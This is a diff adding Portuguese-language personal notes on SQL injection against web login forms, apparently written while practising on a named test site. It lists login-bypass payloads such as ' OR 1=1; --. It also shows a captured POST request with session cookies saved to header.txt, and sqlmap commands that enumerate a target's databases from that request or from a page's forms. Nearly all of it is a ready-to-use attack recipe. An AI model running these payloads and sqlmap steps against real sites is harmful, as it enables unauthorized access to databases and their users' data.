@@ -1,0 +1,36 @@
+
+	---------------------------------------	          SQLinjection em formulários        ----------------------------------------------
+	
+	site teste: http://www.bancocn.com/admin/login.php
+	
+	formulário: 						injetando códigos ( aspas simples or duas aspas simples igual a aspas simples ) 
+		usuário: xxx   ------------------ > 		'or''='         ' OR 1=1; --      
+		login: xxx     ------------------ > 		'or''='		'=' 
+										
+
+	Interceptando request nos formulários com burpsuit: 
+	
+	nano header.txt 
+	
+	POST /admin/index.php HTTP/1.1
+	Host: www.bancocn.com
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
+	Cookie: cf_clearance=k.ZL3qaQDaabmNUv7DWMkU8Uqo3vyCKRpACHrxcoz_8-1655355922-0-150; PHPSESSID=j8qldjfhs7apnf0d042jrb2jv6; cf_chl_2=439c722b850a342; 	cf_chl_prog=x12	
+	Upgrade-Insecure-Requests: 1
+
+	user=admin&password=admin
+
+	sqlmap -r header.txt --dbs
+	OR
+	sqlmap -r header.txt --dbs -p user|password 
+	
+	------------------------------------	
+	SQLinjection sem precisar passar um header.txt: 
+	
+	- > sqlmap -u site --forms --dbms=(nome do banco de dados) --dbs 
+	-u site onde tá o post
+	--forms identificar onde está o post 
+	--dbms=bancodedados
+	
+
+
